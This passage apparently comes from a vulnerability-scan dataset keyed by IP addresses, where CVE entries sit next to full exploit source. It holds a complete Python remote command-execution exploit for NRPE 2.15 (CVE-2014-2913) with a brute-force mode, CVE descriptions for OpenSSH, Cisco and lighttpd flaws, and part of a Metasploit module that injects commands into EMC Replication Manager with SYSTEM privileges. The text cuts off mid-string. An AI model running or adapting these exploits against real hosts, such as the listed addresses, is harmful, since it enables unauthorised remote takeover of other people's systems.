http://www.exploit-db.com/exploits/32925/\r\n# http://www.homelab.it/index.php/2014/05/03/nagios-nrpe-remote-command-injection-test-fix/ (ITA)\r\n#\r\n# Tested on CentOS 5.x, CentOS 6.x, BacBox 3.x, KaliLinux 1.0.6 with Python 2.x\r\n#\r\n# Demo: https://www.youtube.com/watch?v=nmYiBdnWWcE\r\n#\r\n\r\nimport OpenSSL # non-standard, see http://pyopenssl.sourceforge.net/\r\nimport optparse\r\nimport os\r\nimport signal\r\nimport socket\r\nimport struct\r\nimport sys\r\nimport time\r\n\r\nbanner = \"\"\"\r\n\r\n$$\\   $$\\ $$$$$$$\\  $$$$$$$\\  $$$$$$$$\\        $$$$$$\\        $$\\  $$$$$$$\\\\\r\n$$$\\  $$ |$$  __$$\\ $$  __$$\\ $$  _____|      $$  __$$\\     $$$$ | $$  ____|\r\n$$$$\\ $$ |$$ |  $$ |$$ |  $$ |$$ |            \\__/  $$ |    \\_$$ | $$ |\r\n$$ $$\\$$ |$$$$$$$  |$$$$$$$  |$$$$$\\           $$$$$$  |      $$ | $$$$$$$\\\\\r\n$$ \\$$$$ |$$  __$$< $$  ____/ $$  __|         $$  ____/       $$ | \\_____$$\\\\\r\n$$ |\\$$$ |$$ |  $$ |$$ |      $$ |            $$ |            $$ | $$\\   $$ |\r\n$$ | \\$$ |$$ |  $$ |$$ |      $$$$$$$$\\       $$$$$$$$\\ $$\\ $$$$$$\\\\$$$$$$  |\r\n\\__|  \\__|\\__|  \\__|\\__|      \\________|      \\________|\\__|\\______|\\______/\r\n\r\n\r\n\r\n                  $$$$$$$\\   $$$$$$\\  $$$$$$$$\\\\\r\n                  $$  __$$\\ $$  __$$\\ $$  _____|\r\n                  $$ |  $$ |$$ /  \\__|$$ |\r\n                  $$$$$$$  |$$ |      $$$$$\\\\\r\n                  $$  __$$< $$ |      $$  __|\r\n                  $$ |  $$ |$$ |  $$\\ $$ |\r\n                  $$ |  $$ |\\$$$$$$  |$$$$$$$$\\\\\r\n                  \\__|  \\__| \\______/ \\________|\r\n                                                   NRPE <= 2.15 R3m0t3 C0mm4nd Ex3cut10n\r\n\r\n\r\n                =============================================\r\n                - Release date: 17.04.2014\r\n                - Discovered by: Dawid Golunski\r\n                - Severity: High\r\n                - CVE: 2014-2913\r\n                =============================================\r\n\r\n                                Written by:\r\n\r\n                              Claudio Viviani\r\n\r\n                           http://www.homelab.it\r\n\r\n                              info@homelab.it\r\n                           homelabit@protonmail.ch\r\n\r\n                      https://www.facebook.com/homelabit\r\n                      https://twitter.com/homelabit\r\n                      https://plus.google.com/+HomelabIt1/\r\n            https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww\r\n\r\n\"\"\"\r\n# Plugin list for Brute force mode\r\nPluginList = ['check_all',\r\n             'check_apt',\r\n             'check_bdii',\r\n             'check_bonding',\r\n             'check_breeze',\r\n             'check_by_ssh',\r\n             'check_check-updates',\r\n             'check_check_sip',\r\n             'check_cluster',\r\n             'check_dhcp',\r\n             'check_dig',\r\n             'check_disk',\r\n             'check_disk_smb',\r\n             'check_dns',\r\n             'check_dpm-disk',\r\n             'check_dpm-head',\r\n             'check_dummy',\r\n             'check_file_age',\r\n             'check_flexlm',\r\n             'check_fping',\r\n             'check_game',\r\n             'check_hpjd',\r\n             'check_http',\r\n             'check_icmp',\r\n             'check_ide_smart',\r\n             'check_ifoperstatus',\r\n             'check_ifstatus',\r\n             'check_ircd',\r\n             'check_lcgdm',\r\n             'check_lcgdm-common',\r\n             'check_ldap',\r\n             'check_lfc',\r\n             'check_linux_raid',\r\n             'check_load',\r\n             'check_log',\r\n             'check_mailq',\r\n             'check_mrtg',\r\n             'check_mrtgtraf',\r\n             'check_mysql',\r\n             'check_nagios',\r\n             'check_nrpe',\r\n             'check_nt',\r\n             'check_ntp',\r\n             'check_nwstat',\r\n             'check_openmanage',\r\n             'check_oracle',\r\n             'check_overcr',\r\n             'check_perl',\r\n             'check_pgsql',\r\n             'check_ping',\r\n             'check_procs',\r\n             'check_radius',\r\n             'check_real',\r\n             'check_rhev',\r\n             'check_rpc',\r\n             'check_sensors',\r\n             'check_smtp',\r\n             'check_snmp',\r\n             'check_ssh',\r\n             'check_swap',\r\n             'check_tcp',\r\n             'check_time',\r\n             'check_ups',\r\n             'check_users',\r\n             'check_wave']\r\n\r\n\r\n\r\n# nrpe 2.15 skip chars \"|`&><'\\\"\\\\[]{};\" and \"$()\" but not \"\\x0a\"(new line)\r\nevilchar = \"\\x0a\"\r\n\r\nQUERY_PACKET    = 1\r\nRESPONSE_PACKET = 2\r\n\r\nNRPE_PACKET_VERSION_2 = 2\r\n\r\n# max amount of data we'll send in one query/response\r\nMAX_PACKETBUFFER_LENGTH = 1024\r\n\r\n\r\n#def debug(sMessage):\r\n#    \"\"\"Send a string to STDERR\"\"\"\r\n#    if DEBUG:\r\n#        sys.stderr.write(\"%s\\n\" % sMessage)\r\n\r\nclass DataPacket:\r\n    \"\"\"A Python implementation of the C struct, packet.\"\"\"\r\n    def __init__(self, packet_version, packet_type):\r\n        self.nPacketVersion = packet_version # int16\r\n        self.nPacketType = packet_type # int16\r\n        self.nCRC32 = 0 # u_int32\r\n        self.nResultCode = 2324 # int16\r\n        self.sData = ''\r\n        self.tCRC32 = (\r\n             0x00000000, 0x77073096, 0xee0e612c, 0x990951ba, 0x076dc419,\r\n             0x706af48f, 0xe963a535, 0x9e6495a3, 0x0edb8832, 0x79dcb8a4,\r\n             0xe0d5e91e, 0x97d2d988, 0x09b64c2b, 0x7eb17cbd, 0xe7b82d07,\r\n             0x90bf1d91, 0x1db71064, 0x6ab020f2, 0xf3b97148, 0x84be41de,\r\n             0x1adad47d, 0x6ddde4eb, 0xf4d4b551, 0x83d385c7, 0x136c9856,\r\n             0x646ba8c0, 0xfd62f97a, 0x8a65c9ec, 0x14015c4f, 0x63066cd9,\r\n             0xfa0f3d63, 0x8d080df5, 0x3b6e20c8, 0x4c69105e, 0xd56041e4,\r\n             0xa2677172, 0x3c03e4d1, 0x4b04d447, 0xd20d85fd, 0xa50ab56b,\r\n             0x35b5a8fa, 0x42b2986c, 0xdbbbc9d6, 0xacbcf940, 0x32d86ce3,\r\n             0x45df5c75, 0xdcd60dcf, 0xabd13d59, 0x26d930ac, 0x51de003a,\r\n             0xc8d75180, 0xbfd06116, 0x21b4f4b5, 0x56b3c423, 0xcfba9599,\r\n             0xb8bda50f, 0x2802b89e, 0x5f058808, 0xc60cd9b2, 0xb10be924,\r\n             0x2f6f7c87, 0x58684c11, 0xc1611dab, 0xb6662d3d, 0x76dc4190,\r\n             0x01db7106, 0x98d220bc, 0xefd5102a, 0x71b18589, 0x06b6b51f,\r\n             0x9fbfe4a5, 0xe8b8d433, 0x7807c9a2, 0x0f00f934, 0x9609a88e,\r\n             0xe10e9818, 0x7f6a0dbb, 0x086d3d2d, 0x91646c97, 0xe6635c01,\r\n             0x6b6b51f4, 0x1c6c6162, 0x856530d8, 0xf262004e, 0x6c0695ed,\r\n             0x1b01a57b, 0x8208f4c1, 0xf50fc457, 0x65b0d9c6, 0x12b7e950,\r\n             0x8bbeb8ea, 0xfcb9887c, 0x62dd1ddf, 0x15da2d49, 0x8cd37cf3,\r\n             0xfbd44c65, 0x4db26158, 0x3ab551ce, 0xa3bc0074, 0xd4bb30e2,\r\n             0x4adfa541, 0x3dd895d7, 0xa4d1c46d, 0xd3d6f4fb, 0x4369e96a,\r\n             0x346ed9fc, 0xad678846, 0xda60b8d0, 0x44042d73, 0x33031de5,\r\n             0xaa0a4c5f, 0xdd0d7cc9, 0x5005713c, 0x270241aa, 0xbe0b1010,\r\n             0xc90c2086, 0x5768b525, 0x206f85b3, 0xb966d409, 0xce61e49f,\r\n             0x5edef90e, 0x29d9c998, 0xb0d09822, 0xc7d7a8b4, 0x59b33d17,\r\n             0x2eb40d81, 0xb7bd5c3b, 0xc0ba6cad, 0xedb88320, 0x9abfb3b6,\r\n             0x03b6e20c, 0x74b1d29a, 0xead54739, 0x9dd277af, 0x04db2615,\r\n             0x73dc1683, 0xe3630b12, 0x94643b84, 0x0d6d6a3e, 0x7a6a5aa8,\r\n             0xe40ecf0b, 0x9309ff9d, 0x0a00ae27, 0x7d079eb1, 0xf00f9344,\r\n             0x8708a3d2, 0x1e01f268, 0x6906c2fe, 0xf762575d, 0x806567cb,\r\n             0x196c3671, 0x6e6b06e7, 0xfed41b76, 0x89d32be0, 0x10da7a5a,\r\n             0x67dd4acc, 0xf9b9df6f, 0x8ebeeff9, 0x17b7be43, 0x60b08ed5,\r\n             0xd6d6a3e8, 0xa1d1937e, 0x38d8c2c4, 0x4fdff252, 0xd1bb67f1,\r\n             0xa6bc5767, 0x3fb506dd, 0x48b2364b, 0xd80d2bda, 0xaf0a1b4c,\r\n             0x36034af6, 0x41047a60, 0xdf60efc3, 0xa867df55, 0x316e8eef,\r\n             0x4669be79, 0xcb61b38c, 0xbc66831a, 0x256fd2a0, 0x5268e236,\r\n             0xcc0c7795, 0xbb0b4703, 0x220216b9, 0x5505262f, 0xc5ba3bbe,\r\n             0xb2bd0b28, 0x2bb45a92, 0x5cb36a04, 0xc2d7ffa7, 0xb5d0cf31,\r\n             0x2cd99e8b, 0x5bdeae1d, 0x9b64c2b0, 0xec63f226, 0x756aa39c,\r\n             0x026d930a, 0x9c0906a9, 0xeb0e363f, 0x72076785, 0x05005713,\r\n             0x95bf4a82, 0xe2b87a14, 0x7bb12bae, 0x0cb61b38, 0x92d28e9b,\r\n             0xe5d5be0d, 0x7cdcefb7, 0x0bdbdf21, 0x86d3d2d4, 0xf1d4e242,\r\n             0x68ddb3f8, 0x1fda836e, 0x81be16cd, 0xf6b9265b, 0x6fb077e1,\r\n             0x18b74777, 0x88085ae6, 0xff0f6a70, 0x66063bca, 0x11010b5c,\r\n             0x8f659eff, 0xf862ae69, 0x616bffd3, 0x166ccf45, 0xa00ae278,\r\n             0xd70dd2ee, 0x4e048354, 0x3903b3c2, 0xa7672661, 0xd06016f7,\r\n             0x4969474d, 0x3e6e77db, 0xaed16a4a, 0xd9d65adc, 0x40df0b66,\r\n             0x37d83bf0, 0xa9bcae53, 0xdebb9ec5, 0x47b2cf7f, 0x30b5ffe9,\r\n             0xbdbdf21c, 0xcabac28a, 0x53b39330, 0x24b4a3a6, 0xbad03605,\r\n             0xcdd70693, 0x54de5729, 0x23d967bf, 0xb3667a2e, 0xc4614ab8,\r\n             0x5d681b02, 0x2a6f2b94, 0xb40bbe37, 0xc30c8ea1, 0x5a05df1b,\r\n             0x2d02ef8d)\r\n\r\n    def __str__(self):\r\n        # Turn whatever string data we have into a null terminated string\r\n        if len(self.sData) < MAX_PACKETBUFFER_LENGTH:\r\n            sData = self.sData + \"\\0\" * (MAX_PACKETBUFFER_LENGTH - len(self.sData))\r\n            sData += \"SR\" # not sure about this, from perl\r\n        elif len(self.sData) == MAX_PACKETBUFFER_LENGTH + 2:\r\n            sData = self.sData\r\n        else:\r\n            raise ValueError(\"CHECK_NRPE: invalid input\")\r\n        # Return a string that equals the C struct, not something printable\r\n        return struct.pack(\"!hhLh\" + str(len(sData)) + \"s\", self.nPacketVersion,\r\n            self.nPacketType, self.nCRC32, self.nResultCode, sData)\r\n\r\n    def __len__(self):\r\n        return len(self.__str__())\r\n\r\n    def dumpself(self):\r\n        \"\"\"Debugging output for self as C structure.\r\n\r\n        Not normally used.\"\"\"\r\n        sElf = self.__str__()\r\n        sPrev = sElf[0:1]\r\n        nCount = 0\r\n        ii = -1\r\n        for sChar in sElf[1:]:\r\n            ii += 1\r\n            if sChar == sPrev:\r\n                nCount += 1\r\n                continue\r\n            if nCount:\r\n                print \"%d\\t%d *\" % (ii - nCount, nCount + 1),\r\n                nCount = 0\r\n            else:\r\n                print \"%d\\t\" % ii,\r\n            print \"\\t'%s' (%d)\" % (sPrev, ord(sPrev))\r\n            sPrev = sChar\r\n        print \"%d\\t\\t'%s' (%d)\" % (ii + 1, sPrev, ord(sPrev))\r\n\r\n    def calculate_crc32(self):\r\n        \"\"\"Calculate the CRC32 value for the string version of self.\"\"\"\r\n        nCRC = 0xFFFFFFFF\r\n        for ii in self.__str__():\r\n            nIndex = (nCRC ^ ord(ii)) & 0xFF\r\n            nCRC = ((nCRC >> 8) & 0x00FFFFFF) ^ self.tCRC32[nIndex]\r\n        self.nCRC32 = nCRC ^ 0xFFFFFFFF\r\n        #debug(\"DataPacket.calculate_crc32 = %d\" % self.nCRC32)\r\n\r\n    def extract(self, sQuery):\r\n        \"\"\"Turn a string into the DataPacket attributes.\"\"\"\r\n        #debug(\"DataPacket.extract(%d)\" % len(sQuery))\r\n        tVals = struct.unpack(\"!hhLh\" + str(len(sQuery) - 10) + \"s\", sQuery)\r\n        self.nPacketVersion = tVals[0]\r\n        self.nPacketType = tVals[1]\r\n        self.nCRC32 = tVals[2]\r\n        self.nResultCode = tVals[3]\r\n        self.sData = tVals[4]\r\n\r\nm_nTimeout = 0\r\ndef alarm_handler(nSignum, oFrame):\r\n    \"\"\"Timeout catcher\"\"\"\r\n    raise KeyboardInterrupt(\"CHECK_NRPE: Socket timeout after %d seconds.\" %\r\n        m_nTimeout)\r\n\r\n\r\nclass NrpeClient(DataPacket):\r\n    \"\"\"Everything needed to send a message to an NRPE server and get data back.\r\n    \"\"\"\r\n    def __init__(self, server_name, server_port=5666, use_ssl=True, timeout=10,\r\n                 packet_version=NRPE_PACKET_VERSION_2):\r\n        DataPacket.__init__(self, packet_version, QUERY_PACKET)\r\n        self.sServer = server_name\r\n        self.nPort = server_port\r\n        self.bUseSSL = use_ssl\r\n        self.nTimeout = timeout\r\n\r\n    def run_query(self, sQuery):\r\n        \"\"\"Connect to the NRPE server, send the query and get back data.\r\n        \"\"\"\r\n        # initialize alarm signal handling and set timeout\r\n        signal.signal(signal.SIGALRM, alarm_handler)\r\n        signal.alarm(self.nTimeout)\r\n\r\n        # try to connect to the host at the given port number\r\n        oSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n        # do SSL handshake\r\n        if self.bUseSSL:\r\n            oContext = OpenSSL.SSL.Context(OpenSSL.SSL.TLSv1_METHOD)\r\n            oContext.set_cipher_list('ADH')\r\n            oConnection = OpenSSL.SSL.Connection(oContext, oSocket)\r\n        else:\r\n            oConnection = oSocket\r\n\r\n        oConnection.connect((self.sServer, self.nPort))\r\n\r\n        # we're connected and ready to go\r\n        self.sData = sQuery\r\n        self.nCRC32 = 0\r\n        self.calculate_crc32()\r\n\r\n        # send the packet\r\n        oConnection.send(str(self))\r\n\r\n        # wait for the response packet\r\n        sRval = oConnection.recv(len(self))\r\n\r\n        # close the connection\r\n        if self.bUseSSL and not oConnection.shutdown():\r\n            try:\r\n                sRval += oConnection.recv(len(self))\r\n            except OpenSSL.SSL.ZeroReturnError:\r\n                pass\r\n        oSocket.close()\r\n        del oSocket, oConnection\r\n        if self.bUseSSL:\r\n            del oContext\r\n\r\n        # reset timeout\r\n        signal.alarm(0)\r\n\r\n        if len(sRval) == 0:\r\n            raise IOError(\"CHECK_NRPE: Received 0 bytes from daemon.\" +\r\n                \"Check the remote server logs for error messages.\")\r\n        elif len(sRval) < len(self):\r\n            raise IOError(\"CHECK_NRPE: Receive underflow - only \" +\r\n                \"%d bytes received (%d expected).\" % (len(sRval), len(self)))\r\n\r\n        # Become the received data\r\n        self.extract(sRval)\r\n\r\n        # check the crc 32 value\r\n        nRvalCRC = self.nCRC32\r\n        self.nCRC32 = 0\r\n        self.calculate_crc32()\r\n        if nRvalCRC != self.nCRC32:\r\n            raise ValueError(\"CHECK_NRPE: Response packet had invalid CRC32.\")\r\n\r\n        # check packet version\r\n        if self.nPacketVersion != NRPE_PACKET_VERSION_2:\r\n            raise ValueError(\"CHECK_NRPE: Invalid packet version received from server.\")\r\n\r\n        # check packet type\r\n        if self.nPacketType != RESPONSE_PACKET:\r\n            raise ValueError(\"CHECK_NRPE: Invalid packet type received from server.\")\r\n\r\n        # Turn the input data into a proper python string (chop at first NULL)\r\n        for ii in range(len(self.sData)):\r\n            if self.sData[ii] == \"\\0\":\r\n                break\r\n        self.sData = self.sData[0:ii]\r\n\r\n\r\nif __name__ == '__main__':\r\n    m_oOpts = optparse.OptionParser(\"%prog -H Host_or_IP -c nrpe_command --cmd=\\\"command to execute\\\" [-b, --brute] [-n] [-p PORT] [--timeout sec] [--list]\")\r\n    m_oOpts.add_option('--host', '-H', action='store', type='string',\r\n        help='The address of the host running the NRPE daemon (required)')\r\n    m_oOpts.add_option('--ssl', '-n', action='store_false', default=True,\r\n        help='Do no use SSL')\r\n    m_oOpts.add_option('--port', '-p', action='store', type='int', default=5666,\r\n        help='The port on which the daemon is running (default=5666)')\r\n    m_oOpts.add_option('--timeout', '-t', action='store', type='int',\r\n        default=10,\r\n        help='Number of seconds before connection times out (default=10)')\r\n    m_oOpts.add_option('--command', '-c', action='store', type='string',\r\n        #default='get_data',\r\n        help='The name of nrpe command')\r\n    m_oOpts.add_option('--brute', '-b', action='store_true', default=False,\r\n        help='Find existing nrpe command from list [ -list ]')\r\n    m_oOpts.add_option('--list', action='store_true',  default=False,\r\n        help='Show NRPE Command list')\r\n    m_oOpts.add_option('--cmd', action='store', type='string',\r\n        help='Command to execute on the remote server')\r\n\r\n    m_oOptions, m_lArgs = m_oOpts.parse_args()\r\n    m_nTimeout = m_oOptions.timeout\r\n    m_sQuery = m_oOptions.command\r\n    m_gList = m_oOptions.list\r\n    m_sBrute = m_oOptions.brute\r\n\r\n    print (banner)\r\n\r\n    if m_gList:\r\n        print('[+] NRPE Command list\\n')\r\n        for LinesPluginList in PluginList:\r\n            print(LinesPluginList)\r\n        sys.exit(0)\r\n    elif m_sQuery and m_sBrute:\r\n        print m_oOpts.format_help()\r\n        print('[!]')\r\n        print('[!] ERROR: Select only -c OR -b option\\n')\r\n        sys.exit(0)\r\n    elif not m_oOptions.host or not m_oOptions.cmd:\r\n        print m_oOpts.format_help()\r\n        sys.exit(0)\r\n\r\n    print('[+] Target: '+m_oOptions.host)\r\n    print('[+] Command: '+m_oOptions.cmd+' \\n')\r\n\r\n    if m_sBrute:\r\n        print('[+] Brute force Mode....')\r\n        print('[+]')\r\n        for LinesPluginList in PluginList:\r\n\r\n                m_CommandQuery = \"\"\r\n                m_CommandQuery += ' ' + m_oOptions.cmd\r\n                if m_lArgs:\r\n                        m_CommandQuery += ' ' + ' '.join(m_lArgs)\r\n\r\n                m_sQuery = LinesPluginList+'!'+str(evilchar)+str(m_CommandQuery)+' #'\r\n\r\n\r\n                m_oNRPE = NrpeClient(m_oOptions.host, m_oOptions.port, m_oOptions.ssl,\r\n                        m_oOptions.timeout)\r\n                try:\r\n                        m_oNRPE.run_query(m_sQuery)\r\n                except socket.error:\r\n                        print('[!] Connection Error!')\r\n                        sys.exit(1)\r\n                except OpenSSL.SSL.ZeroReturnError:\r\n                        print('[!] Not Vulnerable')\r\n                        print('[!] Option dont_blame_nrpe disabled or service fixed')\r\n                        sys.exit(1)\r\n\r\n                if m_oNRPE.sData[-11:] == \"not defined\":\r\n                        print('[-] Checking for NRPE command '+LinesPluginList+':\\t\\t\\tnot found')\r\n                else:\r\n                        print('[+] Checking for NRPE command '+LinesPluginList+':\\t\\t\\tVULNERABLE!')\r\n                        print('[+]')\r\n                        print('[+] Max Output CHAR 1024 (According to NRPE <= 2.15 specifications)')\r\n                        print('[+]')\r\n                        print('[+] Please ignore NRPE plugin command messages (Usage or Errors)')\r\n                        print('[+]')\r\n                        print(m_oNRPE.sData)\r\n                        sys.exit(0)\r\n    elif m_sQuery:\r\n        print('[+] Custom command Mode....')\r\n        print('[+]')\r\n        print('[+] Connecting......')\r\n\r\n        m_CommandQuery = \"\"\r\n        m_CommandQuery += ' ' + m_oOptions.cmd\r\n        if m_lArgs:\r\n                m_CommandQuery += ' ' + ' '.join(m_lArgs)\r\n\r\n        m_sQuery = m_sQuery+'!'+str(evilchar)+str(m_CommandQuery)+' #'\r\n\r\n        m_oNRPE = NrpeClient(m_oOptions.host, m_oOptions.port, m_oOptions.ssl,\r\n                m_oOptions.timeout)\r\n        try:\r\n               m_oNRPE.run_query(m_sQuery)\r\n        except KeyboardInterrupt:\r\n                print(\"[!] CHECK_NRPE: Socket timeout after %d seconds.\" % m_nTimeout)\r\n                sys.exit(1)\r\n        except socket.error:\r\n                print('[!] Connection Error!')\r\n                sys.exit(1)\r\n        except OpenSSL.SSL.ZeroReturnError:\r\n                print('[!] Not Vulnerable')\r\n                print('[!] Option dont_blame_nrpe disabled or service fixed')\r\n                sys.exit(1)\r\n\r\n        if m_oNRPE.sData[-11:] == \"not defined\":\r\n                print('[-] Checking for NRPE command '+m_oOptions.command+': not found...try other NRPE command')\r\n        else:\r\n                print('[+] Checking for NRPE command '+m_oOptions.command+': VULNERABLE!')\r\n                print('[+]')\r\n                print('[+] Max Output CHAR 1024 (According to NRPE <= 2.15 specifications)')\r\n                print('[+]')\r\n                print('[+] Please ignore NRPE plugin command messages (Usage or Errors)')\r\n                print('[+]')\r\n                print(m_oNRPE.sData)\r\n                sys.exit(0)",
                "description": "NRPE 2.15 - Remote Code Execution",
                "author": "Claudio Viviani",
                "_id": 34461,
                "source": "ExploitDB",
                "platform": "multiple",
                "date": "2014-08-29T00:00:00+00:00",
                "cve": [
                    "CVE-2014-2913"
                ],
                "type": "remote",
                "port": 0
            }
        ],
        "CVE-2013-4508": [
            {
                "source": "CVE",
                "_id": "2013-4508",
                "description": "lighttpd before 1.4.34, when SNI is enabled, configures weak SSL ciphers, which makes it easier for remote attackers to hijack sessions by inserting packets into the client-server data stream or obtain sensitive information by sniffing the network.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2013-4508"
                ],
                "msb": []
            }
        ]
    },
    "152.14.126.138": {
        "CVE-2016-10708": [
            {
                "source": "CVE",
                "_id": "2016-10708",
                "description": "sshd in OpenSSH before 7.4 allows remote attackers to cause a denial of service (NULL pointer dereference and daemon crash) via an out-of-sequence NEWKEYS message, as demonstrated by Honggfuzz, related to kex.c and packet.c.",
                "osvdb": [],
                "bid": [
                    102780
                ],
                "cve": [
                    "CVE-2016-10708"
                ],
                "msb": []
            }
        ],
        "CVE-2011-5000": [
            {
                "source": "CVE",
                "_id": "2011-5000",
                "description": "The ssh_gssapi_parse_ename function in gss-serv.c in OpenSSH 5.8 and earlier, when gssapi-with-mic authentication is enabled, allows remote authenticated users to cause a denial of service (memory consumption) via a large value in a certain length field.  NOTE: there may be limited scenarios in which this issue is relevant.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2011-5000"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2011-4486",
                "description": "Cisco Unified Communications Manager (CUCM) with software 6.x and 7.x before 7.1(5b)su5, 8.0 before 8.0(3a)su3, and 8.5 and 8.6 before 8.6(2a)su1 and Cisco Business Edition 3000 with software before 8.6.3 and 5000 and 6000 with software before 8.6(2a)su1 allow remote attackers to cause a denial of service (device reload) via a crafted SCCP registration, aka Bug ID CSCtu73538.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2011-4486"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2011-2581",
                "description": "The ACL implementation in Cisco NX-OS 5.0(2) and 5.0(3) before 5.0(3)N2(1) on Nexus 5000 series switches, and NX-OS before 5.0(3)U1(2a) on Nexus 3000 series switches, does not properly handle comments in conjunction with deny statements, which allows remote attackers to bypass intended access restrictions in opportunistic circumstances by sending packets, aka Bug IDs CSCto09813 and CSCtr61490.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2011-2581"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2011-4487",
                "description": "SQL injection vulnerability in Cisco Unified Communications Manager (CUCM) with software 6.x and 7.x before 7.1(5b)su5, 8.0 before 8.0(3a)su3, and 8.5 and 8.6 before 8.6(2a)su1 and Cisco Business Edition 3000 with software before 8.6.3 and 5000 and 6000 with software before 8.6(2a)su1 allows remote attackers to execute arbitrary SQL commands via a crafted SCCP registration, aka Bug ID CSCtu73538.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2011-4487"
                ],
                "msb": []
            },
            {
                "code": "##\r\n# This module requires Metasploit: http://metasploit.com/download\r\n# Current source: https://github.com/rapid7/metasploit-framework\r\n##\r\n\r\nrequire 'msf/core'\r\n\r\nclass MetasploitModule < Msf::Exploit::Remote\r\n  Rank = GreatRanking\r\n\r\n  include Msf::Exploit::Remote::Tcp\r\n  include Msf::Exploit::CmdStager\r\n\r\n  def initialize(info = {})\r\n    super(update_info(info,\r\n      'Name'           => 'EMC Replication Manager Command Execution',\r\n      'Description'    => %q{\r\n        This module exploits a remote command-injection vulnerability in EMC Replication Manager\r\n        client (irccd.exe). By sending a specially crafted message invoking RunProgram function an\r\n        attacker may be able to execute arbitrary commands with SYSTEM privileges. Affected\r\n        products are EMC Replication Manager < 5.3. This module has been successfully tested\r\n        against EMC Replication Manager 5.2.1 on XP/W2003. EMC Networker Module for Microsoft\r\n        Applications 2.1 and 2.2 may be vulnerable too although this module have not been tested\r\n        against these products.\r\n      },\r\n      'Author'         =>\r\n        [\r\n          'Unknown', #Initial discovery\r\n          'Davy Douhine' #MSF module\r\n        ],\r\n      'License'        => MSF_LICENSE,\r\n      'References'     =>\r\n        [\r\n          [ 'CVE', '2011-0647' ],\r\n          [ 'OSVDB', '70853' ],\r\n          [ 'BID', '46235' ],\r\n          [ 'URL', 'http://www.securityfocus.com/archive/1/516260' ],\r\n          [ 'ZDI', '11-061' ]\r\n        ],\r\n      'DisclosureDate' => 'Feb 07 2011',\r\n      'Platform'       => 'win',\r\n      'Arch'           => ARCH_X86,\r\n      'Payload'        =>\r\n        {\r\n          'Space'       => 4096,\r\n          'DisableNops' => true\r\n        },\r\n      'Targets'        =>\r\n        [\r\n          # Tested on Windows XP and Windows 2003\r\n          [ 'EMC Replication Manager 5.2.1 / Windows Native Payload', { } ]\r\n        ],\r\n      'CmdStagerFlavor' => 'vbs',\r\n      'DefaultOptions' =>\r\n        {\r\n          'WfsDelay' => 5\r\n        },\r\n      'DefaultTarget'  => 0,\r\n      'Privileged'     => true\r\n      ))\r\n\r\n    register_options(\r\n      [\r\n        Opt::RPORT(6542)\r\n      ], self.class)\r\n  end\r\n\r\n  def exploit\r\n    execute_cmdstager({:linemax => 5000})\r\n  end\r\n\r\n  def execute_command(cmd, opts)\r\n    connect\r\n    hello = \"1HELLOEMC00000000000000000000000\"\r\n    vprint_status(\"Sending hello...\")\r\n    sock.put(hello)\r\n    result = sock.get_once || ''\r\n    if result =~ /RAWHELLO/\r\n      vprint_good(\"Expected hello response\")\r\n    else\r\n      disconnect\r\n      fail_with(Failure::Unknown, \"Failed to hello the server\")\r\n    end\r\n\r\n    start_session = \"EMC_Len0000000136<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?><ir_message ir_sessionId=0000 ir_type=\\\"ClientStartSession\\\" <ir_version>1</ir_version></ir_message>\"\r\n    vprint_status(\"Starting session...\")\r\n    sock.put(start_session)\r\n    result = sock.get_once || ''\r\n    if result =~ /EMC/\r\n      vprint_good(\"A session has been created. Good.\")\r\n    else\r\n      disconnect\r\n      fail_with(Failure::Unknown, \"Failed to create the session\")\r\n    end\r\n\r\n    run_prog = \"<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?> \"\r\n    run_prog << \"<ir_message ir_sessionId=\\\"01111\\\" ir_requestId=\\\"00000\\\" ir_type=\\\"RunProgram\\\" ir_status=\\\"0\\\"><ir_runProgramCommand>cmd /c #{cmd}</ir_runProgramCommand>\"\r\n    run_prog << \"<ir_runProgramAppInfo><?xml version=\"1.0\" encoding=\"UTF-8\"?> <ir_message ir_sessionId=\"00000\" ir_requestId=\"00000\" \"\r\n    run_prog << \"ir_type=\"App Info\" ir_status=\"0\"><IR_groupEntry IR_groupType=\"anywriter\"  IR_groupName=\"CM1109A1\"  IR_groupId=\"1\" \"\r\n    run_prog << \"><?xml version=\"1.0\" encoding=\"UTF-8\"?\t> <ir_message ir_sessionId=\"00000\" \"\r\n    run_prog << \"ir_requestId=\"00000\"ir_type=\"App Info\" ir_status=\"0\"><aa_anywriter_ccr_node>CM1109A1\"\r\n    run_prog << \"</aa_anywriter_ccr_node><aa_anywriter_fail_1018>0</aa_anywriter_fail_1018><aa_anywriter_fail_1019>0\"\r\n    run_prog << \"</aa_anywriter_fail_1019><aa_anywriter_fail_1022>0</aa_anywriter_fail_1022><aa_anywriter_runeseutil>1\"\r\n    run_prog << \"</aa_anywriter_runeseutil><aa_anywriter_ccr_role>2</aa_anywriter_ccr_role><aa_anywriter_prescript>\"\r\n    run_prog << \"</aa_anywriter_prescript><aa_anywriter_postscript></aa_anywriter_postscript><aa_anywriter_backuptype>1\"\r\n    run_prog << \"</aa_anywriter_backuptype><aa_anywriter_fail_447>0</aa_anywriter_fail_447><aa_anywriter_fail_448>0\"\r\n    run_prog << \"</aa_anywriter_fail_448><aa_exchange_ignore_all>0</aa_exchange_ignore_all><aa_anywriter_sthread_eseutil>0&amp\"\r\n    run_prog << \";lt;/aa_anywriter_sthread_eseutil><aa_anywriter_required_logs>0</aa_anywriter_required_logs><aa_anywriter_required_logs_path\"\r\n    run_prog << \"></aa_anywriter_required_logs_path><aa_anywriter_throttle>1</aa_anywriter_throttle><aa_anywriter_throttle_ios>300\"\r\n    run_prog << \"</aa_anywriter_throttle_ios><aa_anywriter_throttle_dur>1000</aa_anywriter_throttle_dur><aa_backup_username>\"\r\n    run_prog << \"</aa_backup_username><aa_backup_password></aa_backup_password><aa_exchange_checksince>1335208339\"\r\n    run_prog << \"</aa_exchange_checksince> </ir_message></IR_groupEntry> 